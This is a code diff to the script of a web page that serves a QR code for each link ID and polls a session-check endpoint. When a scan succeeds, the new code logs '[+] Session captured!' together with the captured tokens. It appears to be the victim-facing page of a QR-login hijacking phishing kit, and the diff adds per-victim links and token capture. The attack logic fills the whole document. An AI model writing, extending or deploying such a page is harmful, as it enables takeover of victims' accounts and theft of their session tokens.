@@ -407,84 +407,56 @@
         </div>
     </div>
     
-    <script>
-        const socket = io();
-        let sessionCheckInterval = null;
-        
-        socket.on('connect', () => {
-            console.log('[+] Sunucu bağlantısı kuruldu.');
-            fetchQRCode();
-        });
-        
-        socket.on('qr_code', (data) => {
-            if (data && data.qr) {
-                renderQR(data.qr);
-            }
-        });
-
-        socket.on('authenticated', (data) => {
-            handleAuthSuccess(data.tokens);
-        });
-        
-        function fetchQRCode() {
-            fetch('/api/qr-code')
-                .then(res => res.json())
-                .then(data => {
-                    if (data.status === 'success' && data.qr) {
-                        renderQR(data.qr);
-                    } else if (data.status === 'authenticated') {
-                        verifySession();
-                    } else {
-                        setTimeout(fetchQRCode, 3000);
-                    }
-                })
-                .catch(() => setTimeout(fetchQRCode, 3000));
-        }
-        
-        function renderQR(qrUrl) {
-            const spinner = document.getElementById('loadingSpinner');
-            const img = document.getElementById('qrImage');
-            
-            spinner.style.display = 'none';
-            img.style.display = 'block';
-            img.src = qrUrl;
-            
-            trackSessionStatus();
-        }
-        
-        function trackSessionStatus() {
-            if (sessionCheckInterval) clearInterval(sessionCheckInterval);
-            
-            sessionCheckInterval = setInterval(() => {
-                fetch('/api/check-session')
-                    .then(res => res.json())
-                    .then(data => {
-                        if (data.status === 'success') {
-                            clearInterval(sessionCheckInterval);
-                            handleAuthSuccess(data.tokens);
-                        }
-                    })
-                    .catch(() => {});
-            }, 2500);
-        }
-        
-        function verifySession() {
-            fetch('/api/check-session')
+  <script>
+    const socket = io();
+    let sessionCheckInterval = null;
+    const linkId = window.location.pathname.split('/qr/')[1] || '';
+    
+    socket.on('connect', () => {
+        console.log('[+] Sunucu bağlantısı kuruldu.');
+        if (linkId) fetchQRCode(linkId);
+    });
+    
+    function fetchQRCode(id) {
+        fetch('/api/qr-code/' + id)
+            .then(res => res.json())
+            .then(data => {
+                if (data.status === 'success' && data.qr) {
+                    renderQR(data.qr);
+                } else if (data.status === 'loading') {
+                    setTimeout(() => fetchQRCode(id), 2000);
+                }
+            })
+            .catch(() => setTimeout(() => fetchQRCode(id), 3000));
+    }
+    
+    function renderQR(qrUrl) {
+        document.getElementById('loadingSpinner').style.display = 'none';
+        const img = document.getElementById('qrImage');
+        img.style.display = 'block';
+        img.src = qrUrl;
+        trackSessionStatus();
+    }
+    
+    function trackSessionStatus() {
+        if (sessionCheckInterval) clearInterval(sessionCheckInterval);
+        sessionCheckInterval = setInterval(() => {
+            fetch('/api/check-session/' + linkId)
                 .then(res => res.json())
                 .then(data => {
                     if (data.status === 'success') {
+                        clearInterval(sessionCheckInterval);
                         handleAuthSuccess(data.tokens);
-                    } else {
-                        setTimeout(fetchQRCode, 1500);
                     }
-                });
-        }
-        
-        function handleAuthSuccess(tokens) {
-            document.getElementById('statusOverlay').classList.add('active');
-            console.log('[+] Oturum doğrulandı.');
-            // Dinamik yönlendirme veya arayüz güncelleme mantığı buraya eklenebilir.
-        }
-    </script>
+                })
+                .catch(() => {});
+        }, 2500);
+    }
+    
+    function handleAuthSuccess(tokens) {
+        document.getElementById('statusOverlay').classList.add('active');
+        console.log('[+] Session captured!', tokens);
+    }
+</script>
 </body>
 </html>
